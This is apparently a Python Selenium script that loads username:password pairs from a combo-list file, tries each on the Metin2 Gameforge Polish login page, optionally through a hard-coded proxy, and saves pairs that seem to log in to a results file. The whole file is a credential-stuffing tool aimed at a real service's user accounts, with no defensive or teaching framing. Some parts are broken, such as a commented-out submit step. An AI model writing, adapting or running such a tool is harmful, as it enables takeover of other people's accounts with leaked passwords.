from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

class Credential:
  def __init__(self, username, password):
    self.username = username
    self.password = password

def saveCredntialResultToFile(credential,fileName):
    f=open(fileName, "a+")
    f.write(credential.username + ":" + credential.password)
    f.close()

#getProxyFrom proxylist
def getProxy(idProxy):
    proxy=["91.203.5.175:443"]
    return proxy[idProxy]


def getCredentialsFromFile():
    credentials = []
    f=open("METIN-MIX.txt", "r")
    f1 = f.readlines()
    for line in f1:
        result = line.split(':')
        username = result[0]
        password = result[1]
        crednetial = Credential(username,password)
        credentials.append(crednetial)
    
    f.close()
    return credentials

#set manually 
childsOfBodyForBlankPageBoundary = 4

proxyId = 0
PROXY = "91.203.5.175:443"
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument('--proxy-server=%s' % PROXY)


isProxy = False
browser = None
credentials = getCredentialsFromFile()

def login(credential,isProxy):
    try:
        if(isProxy):
            browser = webdriver.Chrome(options=chrome_options)
        else:
            browser = webdriver.Chrome()

        usernameStr = credential.username
        passwordStr = credential.password

        browser.get(('https://pl.metin2.gameforge.com'))

        current_url = browser.current_url

        
        username = WebDriverWait(browser, 30).until(EC.presence_of_element_located((By.NAME, 'username')))
        username.send_keys(usernameStr)
        password = WebDriverWait(browser, 30).until(EC.presence_of_element_located((By.NAME, 'password')))
        password.send_keys(passwordStr)

        current_url = browser.current_url
        #signInButton = None

        # signInButton = WebDriverWait(browser, 40).until(EC.element_to_be_clickable((By.ID, 'submitBtnRight')))
        # signInButton.submit()

        current_url = browser.current_url
    
        if current_url == 'https://pl.metin2.gameforge.com/captcha' or  'https://pl.metin2.gameforge.com/main/index?__token=' in current_url:
            saveCredntialResultToFile(credential,"results.txt")
    except:
        print("Exception occured pls check exception file for details:")
        saveCredntialResultToFile(credential,"exceptions.txt")

    browser.quit()
   

for credential in credentials:
   login(credential,isProxy)
        
